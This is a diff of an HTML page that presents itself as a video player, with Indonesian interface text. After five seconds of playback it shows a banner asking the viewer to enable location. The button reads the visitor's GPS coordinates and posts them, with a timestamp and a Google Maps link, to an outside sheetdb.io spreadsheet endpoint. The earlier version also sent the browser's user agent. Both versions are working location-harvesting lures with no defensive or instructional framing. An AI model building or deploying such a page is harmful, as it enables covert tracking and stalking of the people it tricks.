@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Video Player</title>
+  <title>Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 
@@ -11,49 +11,42 @@
   <source src="https://files.catbox.moe/a6i2nt.mp4" type="video/mp4">
 </video>
 
-<div id="lokasiBox" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; padding:20px; text-align:center;">
-  <p>Aktifkan lokasi untuk melanjutkan</p>
-  <button onclick="ambilLokasi()" style="padding:10px 20px;">Aktifkan Lokasi</button>
+<div id="box" style="display:none; position:fixed; bottom:0; width:100%; background:black; color:white; text-align:center; padding:15px;">
+  <p>Aktifkan lokasi</p>
+  <button onclick="go()" style="padding:10px;">Aktifkan</button>
 </div>
 
 <script>
-let video = document.getElementById("vid");
+let v = document.getElementById("vid");
 
-// popup muncul di detik ke 5
-video.addEventListener("timeupdate", function() {
-  if (video.currentTime > 5) {
-    document.getElementById("lokasiBox").style.display = "block";
+v.ontimeupdate = () => {
+  if (v.currentTime > 5) {
+    document.getElementById("box").style.display = "block";
   }
-});
+};
 
-function ambilLokasi() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(pos) {
+function go() {
+  navigator.geolocation.getCurrentPosition(pos => {
 
-      let lat = pos.coords.latitude;
-      let lon = pos.coords.longitude;
+    let lat = pos.coords.latitude;
+    let lon = pos.coords.longitude;
 
-      fetch("https://sheetdb.io/api/v1/2ipys7fb7fh8h", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          data: [{
-            waktu: new Date().toLocaleString(),
-            latitude: lat,
-            longitude: lon,
-            device: navigator.userAgent
-          }]
-        })
-      });
-
-      alert("Lokasi berhasil dikirim");
-
-    }, function() {
-      alert("Izin lokasi ditolak");
+    fetch("https://sheetdb.io/api/v1/2ipys7fb7fh8h", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        data: [{
+          waktu: new Date().toLocaleString(),
+          latitude: lat,
+          longitude: lon,
+          maps: "https://www.google.com/maps?q=" + lat + "," + lon
+        }]
+      })
     });
-  }
+
+    alert("Lokasi terkirim");
+
+  });
 }
 </script>
 
